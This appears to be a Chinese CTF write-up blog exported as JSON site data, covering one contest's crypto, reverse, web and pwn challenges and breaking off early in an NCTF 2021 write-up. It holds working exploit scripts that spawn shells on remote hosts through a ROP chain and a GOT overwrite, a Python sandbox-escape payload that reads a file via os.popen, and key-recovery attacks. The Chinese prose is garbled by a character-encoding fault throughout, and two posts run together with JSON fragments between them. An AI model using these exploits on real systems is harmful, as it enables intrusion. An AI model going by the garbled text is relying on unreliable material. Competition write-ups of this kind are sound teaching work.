http://sushu_5rg35rg4g.nssctf.neusoft.edu.cn/ é¡µé¢è¾“å…¥10ä¸ª1024ä½ä»¥ä¸Šçš„ç´ æ•°æäº¤æ‹¿flagã€‚ç”Ÿæˆ1025ä½çš„ç´ æ•°ï¼š 1234from Crypto.Util.number import *for i in range(10): print(getPrime(1025)) flagï¼šflag&#123;d6a6a1bc-88e9-4330-83f9-bdd3bdad5401&#125;ã€‚ â€‹ silent_peeper You are just a silent peeper, silently discovering the secret. 12345678910111213141516171819202122232425262728from Crypto.Util.number import *from Crypto.Cipher import AESimport binasciiflag = &quot;flag&#123;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&#125;&quot;bs = AES.block_sizepad = lambda s: s + (bs - len(s) % bs) * chr(bs - len(s) % bs)p = 174807157365465092731323561678522236549173502913317875393564963123330281052524687450754910240009920154525635325209526987433833785499384204819179549544106498491589834195860008906875039418684191252537604123129659746721614402346449135195832955793815709136053198207712511838753919608894095907732099313139446299843g = 41899070570517490692126143234857256603477072005476801644745865627893958675820606802876173648371028044404957307185876963051595214534530501331532626624926034521316281025445575243636197258111995884364277423716373007329751928366973332463469104730271236078593527144954324116802080620822212777139186990364810367977a = getRandomNBitInteger(40)b = getRandomNBitInteger(40)A = pow(g, a, p)B = pow(g, b, p)assert pow(A, b, p) == pow(B, a, p)key = pow(A, b ,p)key = long_to_bytes(key)[:16]cipher = AES.new(key, AES.MODE_ECB)ciphertext = cipher.encrypt(pad(flag))with open(&#x27;cipher&#x27;, &#x27;w&#x27;) as f: f.write(&quot;A, B = &#123;&#125;\\n&quot;.format(str((A, B)))) f.write(&quot;ciphertext = &#123;&#125;\\n&quot;.format(binascii.hexlify(ciphertext))) f.close()# cipher# A, B = (142989488568573584455487421652639325256968267580899511353325709765313839485530879575182195391847106611058986646758739505820350416810754259522949402428485456431884223161690132385605038767582431070875138678612435983425500273038807582069763455994486365993366499478412783220052753597397455113133312907456163112016L, 16631700400183329608792112442038543911563829699195024819408410612490671355739728510944167852170853457830111233224257622677296345757516691802411264928943809622556723315310581871447325139349242754287009766402650270061476954875266747743058962546605854650101122523183742112737784691464177427011570888040416109544L)# ciphertext = ed5c68ebb65aa3a13afb259cf3984ce60bdc54b7ef918b850745df850cf4c450b02216c0c6e67ed501a17e516496cd6c Diffie-Hellmanå¯†é’¥äº¤æ¢ï¼Œå·²çŸ¥ç”Ÿæˆå…ƒ $g$ã€æ¨¡æ•° $p$ å’ŒABæ ¹æ®40ä½éšæœºæ•° $a,b$ ç”Ÿæˆçš„å„è‡ªçš„æ•° $A=g^a \\pmod p,B=g^b \\pmod p$ï¼Œæ±‚å…±äº«å¯†é’¥ $K=g^{ab} \\pmod p$ã€‚ $a,b$ éƒ½ä¸º40ä½æ¯”è¾ƒå°ï¼Œå¯ä»¥é‡‡ç”¨lambdaç®—æ³•è§£ç¦»æ•£å¯¹æ•°ï¼Œè§£å‡º $a$ æˆ– $b$ å³å¯è®¡ç®— $K$ï¼š 12345678910111213141516# Sagep = 174807157365465092731323561678522236549173502913317875393564963123330281052524687450754910240009920154525635325209526987433833785499384204819179549544106498491589834195860008906875039418684191252537604123129659746721614402346449135195832955793815709136053198207712511838753919608894095907732099313139446299843g = 41899070570517490692126143234857256603477072005476801644745865627893958675820606802876173648371028044404957307185876963051595214534530501331532626624926034521316281025445575243636197258111995884364277423716373007329751928366973332463469104730271236078593527144954324116802080620822212777139186990364810367977A, B = (142989488568573584455487421652639325256968267580899511353325709765313839485530879575182195391847106611058986646758739505820350416810754259522949402428485456431884223161690132385605038767582431070875138678612435983425500273038807582069763455994486365993366499478412783220052753597397455113133312907456163112016, 16631700400183329608792112442038543911563829699195024819408410612490671355739728510944167852170853457830111233224257622677296345757516691802411264928943809622556723315310581871447325139349242754287009766402650270061476954875266747743058962546605854650101122523183742112737784691464177427011570888040416109544)k = GF(p)B = k(B)g = k(g)b = discrete_log_lambda(B,g,(1,2**40))ciphertext = &#x27;ed5c68ebb65aa3a13afb259cf3984ce60bdc54b7ef918b850745df850cf4c450b02216c0c6e67ed501a17e516496cd6c&#x27;key = pow(A, b ,p)key = long_to_bytes(key)[:16]cipher = AES.new(key, AES.MODE_ECB)m = cipher.decrypt(bytes.fromhex(ciphertext))print(m)# b&#x27;flag&#123;21384433-0dc7-413b-9d09-64cc97c99730&#125;\\x06\\x06\\x06\\x06\\x06\\x06&#x27; flagï¼šflag&#123;21384433-0dc7-413b-9d09-64cc97c99730&#125;ã€‚ â€‹ WEB[ç­¾åˆ°] flag http://47.106.172.144:65333/ é¡µé¢ä¸æ–­éšæœºè¾“å‡ºflagå„ä½ç½®å¯¹åº”å­—ç¬¦ï¼Œå¤åˆ¶ï¼Œè„šæœ¬å¡«å……ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748flag=[&#x27;?&#x27;]*20flag[11]=&#x27;f&#x27;flag[16]=&#x27;a&#x27;flag[19]=&#x27;9&#x27;flag[10]=&#x27;N&#x27;flag[5]=&#x27;3&#x27;flag[15]=&#x27;n&#x27;flag[16]=&#x27;a&#x27;flag[4]=&#x27;Z&#x27;flag[8]=&#x27;c&#x27;flag[4]=&#x27;Z&#x27;flag[17]=&#x27;W&#x27;flag[11]=&#x27;f&#x27;flag[2]=&#x27;x&#x27;flag[7]=&#x27;u&#x27;flag[9]=&#x27;3&#x27;flag[8]=&#x27;c&#x27;flag[17]=&#x27;W&#x27;flag[11]=&#x27;f&#x27;flag[9]=&#x27;3&#x27;flag[13]=&#x27;G&#x27;flag[11]=&#x27;f&#x27;flag[0]=&#x27;Z&#x27;flag[0]=&#x27;Z&#x27;flag[10]=&#x27;N&#x27;flag[12]=&#x27;b&#x27;flag[1]=&#x27;m&#x27;flag[0]=&#x27;Z&#x27;flag[14]=&#x27;9&#x27;flag[1]=&#x27;m&#x27;flag[0]=&#x27;Z&#x27;flag[16]=&#x27;a&#x27;flag[14]=&#x27;9&#x27;flag[16]=&#x27;a&#x27;flag[13]=&#x27;G&#x27;flag[3]=&#x27;h&#x27;flag[12]=&#x27;b&#x27;flag[11]=&#x27;f&#x27;flag[12]=&#x27;b&#x27;flag[15]=&#x27;n&#x27;flag[3]=&#x27;h&#x27;flag[9]=&#x27;3&#x27;flag[17]=&#x27;W&#x27;flag[5]=&#x27;3&#x27;flag[6]=&#x27;t&#x27;flag[18]=&#x27;5&#x27;print(&#x27;&#x27;.join(flag))# ZmxhZ3tuc3NfbG9naW59 base64è§£ç å¾—flagï¼šflag&#123;nss_login&#125;ã€‚ â€‹ REVERSE[ç­¾åˆ°]signin é€†å‘ çœŸ ç­¾åˆ°é¢˜ 010editor 16è¿›åˆ¶æŸ¥çœ‹ï¼Œæœç´¢å‡ºflagï¼šflag&#123;REVERSE_1s_Very_3asy!&#125;ã€‚ â€‹ [èŒæ–°]happyCTFIDAåç¼–è¯‘ï¼Œå‘ç°å»äº†ç¬¦å·ï¼Œåˆ†æä»£ç é€»è¾‘ï¼Œéœ€è¾“å…¥é•¿åº¦24çš„flagå­—ç¬¦ä¸²ï¼Œç» sub_403B70() å‡½æ•°é‡Œé€å­—ç¬¦å¼‚æˆ–0x14åï¼Œä¸å­—ç¬¦ä¸² rxusoCqxw&#123;yqK`&#123;KZqag&#123;r`i æ¯”è¾ƒï¼Œç›¸ç­‰åˆ™é€šè¿‡ã€‚ æŒ‰å¼‚æˆ–æ€§è´¨ï¼Œå°†å­—ç¬¦ä¸²ä¸0x14é€å­—ç¬¦å¼‚æˆ–è¿˜åŸflagï¼šflag&#123;Welcome_to_Neusoft&#125;ã€‚ â€‹ Remember Crypt 4ä»é¢˜ç›®å°±èƒ½çŒœå‡ºæ˜¯RC4ï¼Œmain() å‡½æ•°ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233int __cdecl main(int argc, const char **argv, const char **envp)&#123; unsigned int v3; // eax unsigned int v4; // eax void *v5; // rax void *v7; // rax int i; // [rsp+24h] [rbp-D4h] void *v9; // [rsp+28h] [rbp-D0h] char v10[32]; // [rsp+30h] [rbp-C8h] BYREF char Str[128]; // [rsp+50h] [rbp-A8h] BYREF strcpy(Str, &quot;12345678abcdefghijklmnopqrspxyz&quot;); memset(&amp;Str[32], 0, 0x60ui64); memset(v10, 0, 0x17ui64); sub_1400054D0(&quot;%s&quot;, v10); v9 = malloc(0x408ui64); v3 = strlen(Str); sub_140001120(v9, Str, v3); v4 = strlen(v10); sub_140001240(v9, v10, v4); for ( i = 0; i &lt; 22; ++i ) &#123; if ( ((unsigned __int8)v10[i] ^ 0x22) != byte_14013B000[i] ) &#123; v5 = (void *)sub_1400015A0(&amp;off_14013B020, &quot;error&quot;); _CallMemberFunction0(v5, sub_140001F10); return 0; &#125; &#125; v7 = (void *)sub_1400015A0(&amp;off_14013B020, &quot;nice job&quot;); _CallMemberFunction0(v7, sub_140001F10); return 0;&#125; æ•´ä½“é€»è¾‘ä¸ºï¼Œè¾“å…¥å­—ç¬¦ä¸²ç»è¿‡ sub_140001120() å’Œ sub_140001240() å‡½æ•°å¤„ç†åï¼Œä¸0x22å¼‚æˆ–ï¼Œä¸ byte_14013B000 æ•°ç»„æ¯”è¾ƒã€‚çœ‹ä¸¤å‡½æ•°ç‰¹å¾ï¼Œåˆ†åˆ«ä¸ºRC4ç®—æ³•çš„KSAå’ŒPRGAå‡½æ•°ï¼Œkeyä¸º 12345678abcdefghijklmnopqrspxyzã€‚ IDAæå–æ•°ç»„hexå€¼ï¼š9EE7305FA701A653591B0A20F173D10EAB09840E8D2B0000ï¼ŒCyberchef FromHex+XOR+RC4ä¸€æŠŠæ¢­ï¼Œå¾—åˆ°flagï¼šflag&#123;nice_to_meet_you&#125;ã€‚ â€‹ PWN[ç­¾åˆ°]NssShop nc 47.106.172.144 65002 çœŸ ç­¾åˆ°é¢˜ ä¸ä¼šPWNçš„åŒå­¦ä¹Ÿå¯ä»¥æ¥è¯•è¯• ncè¿æ¥ï¼Œå½“å‰é‡‘é¢ä¸º0ï¼Œé€‰æ‹© 1.Buy Itemï¼Œ çœ‹åˆ°flagä»·æ ¼10000ï¼Œhintä»·æ ¼0ï¼Œé€‰æ‹© 1.Hint:0$ï¼Œ å›æ˜¾ Unlimited purchase of items in the shopï¼Œè¯´æ˜æ•°é‡æ— ä¸Šé™ã€‚ åˆ©ç”¨intå‹æº¢å‡ºæ€§è´¨ï¼Œä½¿å¾—flagå•ä»·ä¸æ•°é‡ä¹˜ç§¯çš„æ€»ä»·ä¸Šæº¢ä¸ºè´Ÿæ•°å³å¯ã€‚ é€‰æ‹© 0.Flag:10000$ï¼Œè¾“å…¥æ•°é‡111111111ï¼Œå¾—åˆ°flagï¼šflag&#123;Pwn_Is_Vary_Ez&#125;ã€‚ justdoit nc 47.106.172.144 65004 IDAåˆ†æï¼Œmain() å‡½æ•°ä»£ç ï¼š 123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf[32]; // [rsp+0h] [rbp-20h] BYREF init(argc, argv, envp); printf(&quot;Hi there! What is your name? &quot;); read(0, buf, 0x18uLL); puts(&quot;That is an interesting chall&quot;); printf(&quot;where are you from? my frends??&quot;); read_long(); return 0;&#125; read_long() å‡½æ•°ï¼š 1234567__int64 read_long()&#123; char buf[32]; // [rsp+0h] [rbp-20h] BYREF read(0, buf, 0x13uLL); return atol(buf);&#125; ä»ä»£ç çœ‹ä¸å‡ºæœ‰ä»€ä¹ˆåˆ©ç”¨ä¹‹å¤„ï¼Œåˆ‡æ¢å›æ±‡ç¼–è§†å›¾ï¼Œå‘ç° read_long() å‡½æ•°åœ¨è¿”å›raxå€¼æ—¶ï¼Œrbpå­˜åœ¨ä¸€ä¸ªåŠ æ“ä½œï¼š 123456789101112131415161718192021222324252627282930313233343536.text:00000000004011D5 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00000000004011D5 public main.text:00000000004011D5 main proc near ; DATA XREF: _start+21â†‘o.text:00000000004011D5.text:00000000004011D5 buf = byte ptr -20h.text:00000000004011D5.text:00000000004011D5 ; __unwind &#123;.text:00000000004011D5 push rbp.text:00000000004011D6 mov rbp, rsp.text:00000000004011D9 sub rsp, 20h.text:00000000004011DD mov eax, 0.text:00000000004011E2 call init.text:00000000004011E7 lea rax, format ; &quot;Hi there! What is your name? &quot;.text:00000000004011EE mov rdi, rax ; format.text:00000000004011F1 mov eax, 0.text:00000000004011F6 call _printf.text:00000000004011FB lea rax, [rbp+buf].text:00000000004011FF mov edx, 18h ; nbytes.text:0000000000401204 mov rsi, rax ; buf.text:0000000000401207 mov edi, 0 ; fd.text:000000000040120C call _read.text:0000000000401211 lea rax, s ; &quot;That is an interesting chall&quot;.text:0000000000401218 mov rdi, rax ; s.text:000000000040121B call _puts.text:0000000000401220 lea rax, aWhereAreYouFro ; &quot;where are you from? my frends??&quot;.text:0000000000401227 mov rdi, rax ; format.text:000000000040122A mov eax, 0.text:000000000040122F call _printf.text:0000000000401234 mov eax, 0.text:0000000000401239 call read_long.text:000000000040123E add rbp, rax ; åŠ æ“ä½œ.text:0000000000401241 mov eax, 0.text:0000000000401246 leave.text:0000000000401247 retn.text:0000000000401247 ; &#125; // starts at 4011D5.text:0000000000401247 main endp æ¥ç€çš„ leave æ˜¯ mov rsp,rbp; pop rbpï¼Œrspå°†å˜ä¸ºrbp+raxï¼Œæ§åˆ¶raxä¸º-0x20-8ï¼Œç»“åˆ leave æ“ä½œå¯ä»¥å°†rspç§»åŠ¨åˆ° buf å¤„ä»¥å†™å…¥ROPé“¾ã€‚ 12345678910111213141516171819202122232425262728293031323334353637from pwn import *binary = context.binary = ELF(&#x27;./justdoit.1&#x27;)p = remote(&#x27;47.106.172.144&#x27;, 65004)libc = ELF(&#x27;./libc-2.23.so&#x27;)pop_rdi = binary.search(asm(&#x27;pop rdi; ret;&#x27;)).__next__()pop2 = binary.search(asm(&#x27;pop r14; pop r15; ret;&#x27;)).__next__()payload = b&#x27;&#x27;payload += p64(binary.sym.main)payload += p64(binary.plt.puts)payload += p64(binary.sym.main)p.sendafter(b&#x27;name? &#x27;, payload)p.sendafter(b&#x27;frends??&#x27;, b&#x27;-40&#x27;)payload = b&#x27;&#x27;payload += p64(pop_rdi)payload += p64(binary.got.puts)payload += p64(pop2)p.sendafter(b&#x27;name? &#x27;, payload)p.sendafter(b&#x27;frends??&#x27;, b&#x27;-40&#x27;)libc.address = u64(p.recv(6) + b&#x27;\\0\\0&#x27;) - libc.sym.putslog.info(&#x27;libc.address: &#x27; + hex(libc.address))payload = b&#x27;&#x27;payload += p64(pop_rdi)payload += p64(libc.search(b&#x27;/bin/sh&#x27;).__next__())payload += p64(libc.sym.system)p.sendafter(b&#x27;name? &#x27;, payload)p.sendafter(b&#x27;frends??&#x27;, b&#x27;-40&#x27;)p.interactive() flagï¼šctf&#123;01241e36-ea17-4bed-b620-f64f10e5c192&#125;ã€‚ â€‹ reallNeedGoodLuck nc 47.106.172.144 65003 IDAåˆ†æï¼Œmain() å‡½æ•°ä»£ç ï¼š 123456789101112131415161718int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; _DWORD *v3; // [rsp+0h] [rbp-30h] int buf; // [rsp+Ch] [rbp-24h] BYREF char nptr[24]; // [rsp+10h] [rbp-20h] BYREF unsigned __int64 v6; // [rsp+28h] [rbp-8h] v6 = __readfsqword(0x28u); init(argc, argv, envp); puts(&quot;need&quot;); puts(&quot;good&quot;); read(0, &amp;buf, 4uLL); puts(&quot;luck! &quot;); read(0, nptr, 9uLL); v3 = (_DWORD *)atoi(nptr); *v3 = buf; exit(0);&#125; buf å’Œ nptr éƒ½æ— æº¢å‡ºç‚¹ï¼Œä½†å¯ä»¥å‘ buf å†™å…¥4å­—èŠ‚å¹¶è¦†ç›–æ‰å†™å…¥npträ¸­å€¼å¯¹åº”åœ°å€çš„å†…å®¹ã€‚ å¯ä»¥ä»»æ„åœ°å€å†™ï¼Œè€ƒè™‘å°† atoi æ”¹ä¸ºlibcä¸­çš„ systemï¼Œå†å‘ system ä¼ å…¥ /bin/sh\\x00 å³å¯getshellï¼Œä¸ºè¾¾æˆä¸¤æ­¥åˆ©ç”¨ï¼Œè¿˜éœ€å°† exit æ”¹ä¸º main åœ°å€ã€‚ atoi ä¸system çš„åç§»åªæœ‰æœ€å2å­—èŠ‚ä¸åŒï¼Œåˆç”±äºASLRå¼€å¯ï¼Œå1.5å­—èŠ‚ä¸º0ï¼Œæ‰€ä»¥æœ‰0.5/8=1/16çš„å‡ ç‡èƒ½å°† atoi æ”¹ä¸º systemã€‚ 12345678910111213141516171819202122232425262728293031323334353637from pwn import *binary = context.binary = ELF(&#x27;./reallNeedGoodLuck.1&#x27;)context.log_level = &#x27;WARN&#x27;attempt = 0while True: try: p = remote(&#x27;47.106.172.144&#x27;, 65003) libc = ELF(&#x27;./libc-2.23.so&#x27;) tout = 1.0 attempt += 1 log.warn(&#x27;attempt: &#x27; + str(attempt)) p.sendafter(b&#x27;good\\n&#x27;,p32(binary.sym.main)) p.sendafter(b&#x27;luck! \\n&#x27;,str(binary.got.exit).encode()) p.sendafter(b&#x27;good\\n&#x27;,p32(((libc.sym.system | 0xf000) &amp; 0xffff) &lt;&lt; 16)) p.sendafter(b&#x27;luck! \\n&#x27;,str(binary.got.atoi - 2).encode()) p.sendafter(b&#x27;good\\n&#x27;,b&#x27;0000&#x27;,timeout=tout) p.sendafter(b&#x27;luck! \\n&#x27;,b&#x27;/bin/sh\\x00&#x27;,timeout=tout) p.sendline(b&#x27;echo test&#x27;) if b&#x27;test&#x27; in p.recvline(timeout=tout): p.interactive() break except AssertionError as err: print(err) sys.exit(1) except: try: p.close() except: continue flagï¼šctf&#123;8b1bf41f-8b38-4487-86ae-a5df4fa4c85e&#125;ã€‚","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021èµ›","slug":"2021èµ›","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"NCTF 2021","slug":"match-NCTF-2021","date":"2021-11-28T12:53:29.000Z","updated":"2021-11-28T19:29:51.642Z","comments":true,"path":"2021/11/28/match-NCTF-2021/","permalink":"https://lazzzaro.github.io/2021/11/28/match-NCTF-2021/","excerpt":"","text":"â€‹ æ¯”èµ›æ—¶é—´ï¼š2021.11.27 9:00-2021.11.28 21:00 æ¯”èµ›åŒºåˆ†æ ¡å†…æ ¡å¤–ï¼Œæ¯”èµ›ç»“æŸåç»“ç®—åˆ†åˆ«æ’åï¼Œæ¯”èµ›æ—¶æ’è¡Œæ¦œä¸åŒºåˆ† æ³¨å†Œé˜Ÿä¼ç™»é™†åï¼Œè¯·åœ¨Profileé¡µé¢ç»‘å®šé˜Ÿä¼æˆå‘˜ä¿¡æ¯ æ¯æ”¯é˜Ÿä¼è‡³å°‘ç»‘å®šä¸€ä¸ªæˆå‘˜ï¼Œä¸è¶…è¿‡4äººï¼Œæ ¡å†…é˜Ÿä¼æ‰€æœ‰æˆå‘˜è¯·å¡«å†™çœŸå®å§“åå’Œæ­£ç¡®å­¦å·ï¼Œæ ¡å¤–é˜Ÿä¼è‡³å°‘ç»‘å®šä¸€ä¸ªæˆå‘˜ï¼Œä»¥ä¾¿é¢å¥–æ—¶è”ç³»ã€‚ æœªç»‘å®šæˆå‘˜ä¿¡æ¯çš„é˜Ÿä¼å¯ä»¥æ­£å¸¸è§£é¢˜ä½†ä¸å‚ä¸æ’å æˆå‘˜ä¿¡æ¯ä¸€ç»ç»‘å®šä¸å¯æ›´æ”¹ ç¦æ­¢å¯¹å¹³å°è¿›è¡Œæ”»å‡» ç¦æ­¢ä¸å…¶ä»–é˜Ÿä¼äº¤æµè§£é¢˜æ€è·¯ è¯·åœ¨æ¯”èµ›ç»“æŸå12å°æ—¶å†…å‘é€è¯¦ç»†è§£é¢˜æ€è·¯ï¼ˆpdfæ ¼å¼ï¼‰åˆ°é‚®ç®±nctf@h4ck.fun Rank: 10 MISCSignin find it ç­¾åˆ°ï¼Œhttps://nctf.h4ck.fun/challenges/NCTF%7BWelcome_to_NCTF_2021!%7Dï¼Œé“¾æ¥å°±æœ‰flagï¼šNCTF&#123;Welcome_to_NCTF_2021!&#125;ã€‚ â€‹ Hexé…±çš„ç§˜å¯†èŠ±å›­ æˆ‘ä»¬å¯çˆ±çš„Hexé…±åˆæœ‰äº†ä¸€ä¸ªå¼ºå¤§çš„åŠŸèƒ½ï¼Œå¯ä»¥å»æ‰§è¡Œå¤šè¡Œè¯­å¥æƒ¹~ä½†æ˜¯ä¸ºäº†é˜²æ­¢æœ‰äº›å±…å¿ƒåµæµ‹çš„äººï¼Œæˆ‘ä»¬ä¸“é—¨ æŠŠæ‹¬å·ï¼Œå•åŒå¼•å·ï¼Œéƒ½è¿‡æ»¤æ‰ï¼Œå™¢å¯¹ä¸å‡†è‰²è‰²ï¼Œæ‰€ä»¥ä¹Ÿä¸å‡†å‡ºç°hå“Ÿ~Ubuntu Python3.6.9å¿«å»æ‰¾Hexé…±(QQ:2821876761)ç§èŠå§ç§èŠå‘é€çš„ä¿¡æ¯ä¸ºæ˜æ–‡ï¼Œä¸éœ€è¦åŠ base64 1234567891011121314import sysfrom base64 import b64decodecode = sys.argv[1]try: data = b64decode(code.encode()).decode()except: exit(0)for c in &#x27;h&quot;\\&#x27;(&#x27;: if c in data: exit(0)exec(data) æŒºæœ‰è¶£çš„ç»“åˆäº†QQBotçš„pythoné€ƒé€¸ï¼Œç”±ä»£ç çŸ¥éœ€ä¼ å…¥pythonä»£ç æ®µï¼Œä¸èƒ½åŒ…å«æ‹¬å·ã€å•åŒå¼•å·å’Œå­—æ¯hï¼Œæœ€åexec å‡½æ•°æ‰§è¡Œã€‚ æ–­æ‰äº† print() å’Œ help() è¾“å‡ºæ–¹å¼ï¼Œå¯ä»¥é‡‡ç”¨pythonä¸­çš„è¯­æ³•ç³– @ ç±»è£…é¥°å™¨ï¼Œåœ¨åˆ›å»ºç±»æ—¶è§¦å‘è£…é¥°å™¨ä¸­çš„ä»£ç é€»è¾‘ï¼š 12345678910x=95,95,105,109,112,111,114,116,95,95,40,39,111,115,39,41,46,112,111,112,101,110,40,39,99,97,116,32,47,104,111,109,101,47,102,108,97,103,39,41,46,114,101,97,100,40,41y=lambda z:x@print@eval@bytes@yclass z: pass#__import__(&#x27;os&#x27;).popen(&#x27;cat /home/flag&#x27;).read() Botè¿”å›flagï¼šNCTF&#123;HexQBot_1s_s0_cut3~&#125;ã€‚ â€‹ åšé¢˜åšç´¯äº†æ¥ç©ç©æ¸¸æˆå§ åšäº†ä¸€å¤©çš„é¢˜ç›®ï¼Œéƒ½ç´¯äº†å§ï¼Œå¿«æ¥ç©ç©æˆ‘æ–°å†™çš„é£æœºå¤§æˆ˜å§ï¼Œåªè¦é€šå…³å°±èƒ½è·å¾—flagå“Ÿï½å¯¹äº†ï¼Œå¦‚æœä½ çœŸçš„æƒ³ç©æ¸¸æˆï¼Œä¹Ÿè®¸ä½ éœ€è¦ä¸€ä¸ªmacï¼ŒIntelå’ŒApple siliconèŠ¯ç‰‡éƒ½æ”¯æŒ Unity3D æ¸¸æˆï¼Œä¸»é€»è¾‘éƒ½åœ¨ Assembly-CSarp.dll ä¸­ï¼Œæ‰¾åˆ°æ–‡ä»¶ï¼š PlaneFire.app/Contents/Resources/Data/Managed/Assembly-CSharp.dll ç”¨ILSpyæŸ¥çœ‹dllç¨‹åºé€»è¾‘ï¼Œå‘ç°æœ€ç»ˆé€šè¿‡è®¿é—® http://h4ck.fun/g4me.txt è·å–flagï¼šNCTF&#123;B9F3C1F2-1E65-481C-8AF3-A78FA7A5EB6A&#125;ã€‚ â€‹ é—®å·é¢˜ é—®å·é“¾æ¥ï¼šhttps://forms.gle/RcKhJo2uQwQrL4Gu9æç¤ºï¼šæ˜¯Googleé—®å· ç­¾é€€ï¼Œç­”å®Œå°±æœ‰flagï¼šNCTF&#123;Thank_y0u_for_your_participation&#125;ã€‚ â€‹ CRYPTOdsa flagæ ¼å¼nctf{.*}ï¼Œé¢˜ç›®è§é™„ä»¶ 12345678910111213141516171819202122232425262728293031323334353637383940from Crypto.Util.number import *from secret import flagfrom hashlib import sha256import osdef keygen(): while True: p = getPrime(522) q = p//2 if isPrime(q): break g = 3 h = long_to_bytes(getPrime(256)) x = int.from_bytes(h*2, &quot;big&quot;) y = pow(g, x, p) return g, p, q, y, xdef sign(h, x): k = sha256(h.encode().hex().encode()).digest()+sha256(bytes.fromhex(h)+x.to_bytes(128, &quot;big&quot;)).digest() k = int.from_bytes(k, &quot;big&quot;) r = pow(g,k,p) s = (r*x+int(h,16))*inverse(k,q)%q return r, sg, p, q, y, x = keygen()flag = int(flag[5:-1],16)^int(sha256(x.to_bytes(128, &quot;big&quot;)).hexdigest(),16)r, s = sign(hex(flag)[2:], x)print(q)print(y)print(flag)print(r)print(s)&#x27;&#x27;&#x27;40650743302059808774634634244068138501542753026953617483148703464113290519480444509529050631824834777584951166961649968888463087750447378168090155240888982037743982251072012463264403932580827621959049035277930304818871889119878506480333248188293037455476433705911511645160292331990658781048396135284434991466243636194805921925438811312671673280199412771068954692916912073818129050333067669919624330046071533920997153227932488842182641815380056666599058512474681029599566250988315160467154466151984370050361176857929057367882169873785845130202154421861254747644911591100925843087118347161726578606012243057783788330822542299254180561801871884967022902307837045926190782819951409650425825871898890839825777&#x27;&#x27;&#x27; DSAç­¾åç®—æ³•ï¼Œå°†æ˜æ–‡ $m$ ä¸ç§é’¥ $x$ å“ˆå¸Œå€¼ $h(x)$ çš„å¼‚æˆ–å€¼ $H=m \\oplus h(x)$ ä¼ å…¥sign() å‡½æ•°ï¼Œå¹¶å°† $H$ ä¸ $h(H+x)$ è¿æ¥å¾—åˆ°çš„ $k$ ä½œä¸ºä¸´æ—¶å¯†é’¥ï¼Œè®¡ç®— $r=g^k \\bmod p$ å’Œ $s=(rx+H)k^{-1} \\bmod q$ï¼Œç»™å‡ºç­¾åç»“æœ $(r,s)$ï¼Œæ±‚ç§é’¥ $x$ã€‚ å·²çŸ¥ $g,q,p=2q+1,y,H,r,s$ï¼Œ$x$ ä¸º512ä½ï¼Œæ ¹æ® x = int.from_bytes(h*2, &quot;big&quot;) å¯çŸ¥ $x \\mid (2^{256}+1)$ï¼Œè®¾ $x=(2^{256}+1)dâ€™$ï¼Œåˆ™ $dâ€™$ ä¹Ÿæ˜¯256ä½ã€‚ $k$ ç”± $H$ ä¸ $h(H+x)$ è¿æ¥å¾—åˆ°ï¼Œ$H$ å·²çŸ¥ï¼Œå³ $k$ çš„é«˜256ä½å·²çŸ¥ï¼Œä½256ä½æœªçŸ¥ï¼Œè®¾ $k=2^{256}H+hâ€™$ã€‚ æ ¹æ® $s=(rx+H)k^{-1} \\bmod q$ï¼Œæœ‰ï¼š $(2^{256}H+hâ€™)s-(2^{256}+1)dâ€™r-H \\equiv 0 \\pmod q$ åˆ©ç”¨coppersmithå®šç†æ„é€ æ ¼ï¼Œé€šè¿‡LLLç®—æ³•è®¡ç®— $(hâ€™,dâ€™)$ï¼Œè¿™é‡Œé‡‡ç”¨small_rootsè„šæœ¬æ”»å‡»ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182# Sageimport itertoolsdef small_roots(f, bounds, m=1, d=None): if not d: d = f.degree() R = f.base_ring() N = R.cardinality() f /= f.coefficients().pop(0) f = f.change_ring(ZZ) G = Sequence([], f.parent()) for i in range(m+1): base = N^(m-i) * f^i for shifts in itertools.product(range(d), repeat=f.nvariables()): g = base * prod(map(power, f.variables(), shifts)) G.append(g) B, monomials = G.coefficient_matrix() monomials = vector(monomials) factors = [monomial(*bounds) for monomial in monomials] for i, factor in enumerate(factors): B.rescale_col(i, factor) B = B.dense_matrix().LLL() B = B.change_ring(QQ) for i, factor in enumerate(factors): B.rescale_col(i, 1/factor) H = Sequence([], f.parent().change_ring(QQ)) for h in filter(None, B*monomials): H.append(h) I = H.ideal() if I.dimension() == -1: H.pop() elif I.dimension() == 0: roots = [] for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root) return roots return []q=4065074330205980877463463424406813850154275302695361748314870346411329051948044450952905063182483477758495116696164996888846308775044737816809015524088898203g=3y=7743982251072012463264403932580827621959049035277930304818871889119878506480333248188293037455476433705911511645160292331990658781048396135284434991466243636h=19480592192543881131267167328019941277106895469291691207381812905033306766991r=962433004607153392099715322793248884218264181538005666659905851247468102959956625098831516046715446615198437005036117685792905736788216987378584513020215442s=1861254747644911591100925843087118347161726578606012243057783788330822542299254180561801871884967022902307837045926190782819951409650425825871898890839825777p=2*q+1from hashlib import sha256import gmpy2kmax=int(sha256(hex(h)[2:].encode().hex().encode()).digest().hex(),16)PR.&lt;h_, d_&gt; = PolynomialRing(Zmod(q))f = (2^256 * kmax + h_) * s - (2^256 + 1) * d_ * r - hroots = small_roots(f, [2^256, 2^256], d=4, m=4)print(roots)for root in roots: kmin = Integer(root[0]) k = (2^256 * kmax + kmin) x_ = Integer(root[1]) x_ = (2^256 + 1) * x_ if pow(g, x_, p) == y: print(&quot;[+] found: &#123;&#125;&quot;.format(x_)) break else: print(&quot;[-] wrong: &#123;&#125;&quot;.format(x_))print(x_)flag = hex(int(sha256(int(x_).to_bytes(128, &quot;big&quot;)).hexdigest(),16) ^^ h)[2:]print(flag)# 1d92dae504a70fbcae6d3721a55d7eacaf94d3133ea5f0394b7d203d64841110 åŠ ä¸Šå¤–å£³ï¼Œflagï¼šnctf&#123;1d92dae504a70fbcae6d3721a55d7eacaf94d3133ea5f0394b7d203d64841110&#125;ã€‚ â€‹ WEBezsql è¿™è¿˜èƒ½æ³¨å…¥å— Hint 1: 